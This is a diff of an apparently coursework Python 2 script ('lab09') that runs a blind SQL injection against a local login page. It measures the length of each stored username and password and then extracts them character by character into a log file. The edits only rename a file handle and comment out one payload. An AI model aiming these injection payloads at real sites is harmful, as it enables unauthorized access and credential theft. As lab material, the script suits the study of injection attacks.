@@ -5,7 +5,7 @@ from itertools import cycle
 
 
 # request = "http://localhost/lab09/login.php?u=\" OR id = 98 AND SUBSTRING(password,1,1) = '1' -- " 
-request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20" 
+# request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBSTRING(password,1,1)%20=%20%271%27%20--%20" 
 # request = "http://localhost/lab09/login.php?u=\"%20OR%201%20--%20 " 
 #bashCommand = "echo 'hello' "
 # subprocess.call(['wget','-q','-O','index.html',request])
@@ -14,14 +14,13 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 #print error
 #print bashCommand
 
-f= open("logs.txt","w+")
+file= open("logs.txt","w+")
 listASCII=string.printable
 iterator=cycle(['username','password'])
 for row in xrange(0,101):
-	f.write(str(row) + "    ")
+	file.write(str(row) + "    ")
 	for iter in xrange(0,2):
 		field=iterator.next()
-		print field
 		size = 0;
 		for s in xrange(0,100):
 			request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20" + str(row) + "%20AND%20length(" + str(field) + ")%20=%20" + str(s) + "--%20"
@@ -42,12 +41,12 @@ for row in xrange(0,101):
 					# print "found letter %s at position %d" %(listASCII[c],pos)
 					word += listASCII[c]
 					break
-		f.write(word)
-		f.write("     ")
+		file.write(word)
+		file.write("     ")
 		
-	f.write("\n")
+	file.write("\n")
 	
-f.close()		
+file.close()		
 
 			
 
